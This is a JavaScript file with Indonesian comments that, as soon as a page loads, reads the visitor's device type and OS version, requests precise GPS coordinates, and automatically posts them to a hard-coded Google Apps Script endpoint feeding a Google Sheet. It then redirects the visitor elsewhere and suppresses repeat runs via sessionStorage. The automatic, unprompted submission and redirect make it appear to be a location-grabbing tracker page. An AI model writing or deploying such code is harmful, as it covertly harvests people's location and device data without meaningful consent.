// Variabel untuk memastikan input perangkat hanya diisi sekali
let isFormFilled = false;

// Cek apakah form sudah disubmit sebelumnya dengan sessionStorage
if (sessionStorage.getItem('formSubmitted') === 'true') {
    window.location.href = './assets/index.html'; // Redirect jika form sudah disubmit
}

// Fungsi untuk mendapatkan informasi perangkat dari user agent
function getDeviceInfo() {
    var userAgent = navigator.userAgent;
    var deviceInfo = "Unknown Device";
    var deviceDetails = "";

    // Cek apakah perangkat mobile atau desktop
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceInfo = "Mobile Device";
        if (/Android/i.test(userAgent)) {
            deviceDetails = "Android Device - " + getAndroidVersion(userAgent);
        } else if (/iPhone/i.test(userAgent)) {
            deviceDetails = "iPhone - " + getIOSVersion(userAgent);
        } else {
            deviceDetails = "Other Mobile Device";
        }
    } else if (/Mac|Windows|Linux/i.test(userAgent)) {
        deviceInfo = "Desktop Device";
        if (/Windows/i.test(userAgent)) {
            deviceDetails = "Windows OS";
        } else if (/Mac/i.test(userAgent)) {
            deviceDetails = "macOS";
        } else if (/Linux/i.test(userAgent)) {
            deviceDetails = "Linux OS";
        }
    }

    return { deviceInfo: deviceInfo, deviceDetails: deviceDetails };
}

// Dapatkan versi Android dari user agent
function getAndroidVersion(userAgent) {
    var match = userAgent.match(/Android (\d+\.\d+)/);
    return match ? match[1] : "Unknown Version";
}

// Dapatkan versi iOS dari user agent
function getIOSVersion(userAgent) {
    var match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
    return match ? match[1].replace('_', '.') : "Unknown Version";
}

// Mengambil informasi lokasi geografis pengguna
function getGeoLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    var geoData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    resolve(geoData); // Mengirimkan data lokasi
                },
                function(error) {
                    reject("Gagal mengambil lokasi: " + error.message);
                }
            );
        } else {
            reject("Geolocation tidak didukung di browser ini.");
        }
    });
}

// Mengisi input perangkat secara otomatis saat halaman dimuat
window.onload = function() {
    if (isFormFilled) {
        return; // Jika form sudah terisi, keluar
    }

    var { deviceInfo, deviceDetails } = getDeviceInfo(); // Dapatkan informasi perangkat
    document.getElementById('device').value = deviceInfo; // Isi kolom perangkat
    document.getElementById('deviceDetails').value = deviceDetails; // Isi kolom rincian perangkat

    // Mengambil geolocation saat halaman dimuat
    getGeoLocation()
        .then(function(geoData) {
            document.getElementById('geoLocation').value = `Lat: ${geoData.latitude}, Long: ${geoData.longitude}, Akurasi: ${geoData.accuracy}m`;
            isFormFilled = true; // Tandai form sudah terisi
            submitForm(); // Panggil submit form setelah mendapatkan geolokasi
        })
        .catch(function(error) {
            document.getElementById('geoLocation').value = error; // Menampilkan error jika gagal mengambil lokasi
            isFormFilled = true; // Tandai form sudah terisi
            submitForm(); // Masih coba kirim form walau gagal mendapatkan lokasi
        });
};
function submitForm() {
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwmp-5KX9OsWT3mzNX1-uynLsq9MCPf5TSVHddvLIh5YKDZpGvQ5N2wDlzG_R0IrOU/exec';
    const form = document.forms['submit-to-google-sheet'];
    const formData = new FormData(form); // Ambil data dari form

    // Mengecek apakah scriptURL ada atau tidak
    if (!scriptURL) {
        alert("URL Google Sheets tidak ditemukan!");
        window.location.href = './error.html'; // Redirect ke halaman error jika scriptURL tidak ada
        return; // Menghentikan eksekusi jika URL tidak valid
    }

    // Mengirimkan data ke Google Sheets menggunakan fetch
    fetch(scriptURL, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            sessionStorage.setItem('formSubmitted', 'true'); // Tandai bahwa form sudah disubmit
            window.location.href = './assets/index.html'; // Redirect ke halaman lain setelah sukses
        } else {
            alert("Terjadi kesalahan: Tidak dapat mengirimkan data!");
            window.location.href = './error.html'; // Redirect ke halaman error jika respon tidak ok
        }
    })
    .catch(error => {
        alert("Terjadi kesalahan: " + error.message);
        console.error('Error!', error.message);
        window.location.href = './error.html'; // Redirect ke halaman error jika terjadi kesalahan
    });
}

